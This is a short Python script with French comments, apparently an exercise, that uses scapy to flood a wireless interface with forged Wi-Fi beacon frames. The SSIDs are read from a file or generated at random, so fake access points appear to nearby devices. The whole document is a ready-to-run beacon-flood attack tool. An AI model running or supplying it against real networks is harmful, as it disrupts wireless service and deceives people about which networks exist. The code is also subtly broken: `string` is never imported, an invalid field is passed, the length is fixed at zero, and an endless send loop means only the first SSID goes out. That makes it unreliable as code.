import random
from scapy.all import *

# Fonction pour générer des SSID aléatoires
def random_ssid(length):
    # Retourne un string de la taille donnée
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# Demander le nombre d'AP à générer ou le nom du fichier contenant les SSID
ssid_file = input("Entrez le nom du fichier contenant les SSID (laissez vide pour générer aléatoirement) : ")
if ssid_file:
    with open(ssid_file) as f:
        ssid_list = f.readlines()
        ssid_list = [x.strip() for x in ssid_list]
else:
    num_ap = int(input("Combien d'AP voulez-vous générer ? "))
    ssid_list = [random_ssid(8) for i in range(num_ap)]


interface = input("Entrez le nom de l'interface à utiliser : ")

# Diffuse les trames de Beacon avec les SSID générés
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID', info='', len=0, version=0)
for ssid in ssid_list:
    essid.info = ssid
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, iface=interface, inter=0.1, loop=1)
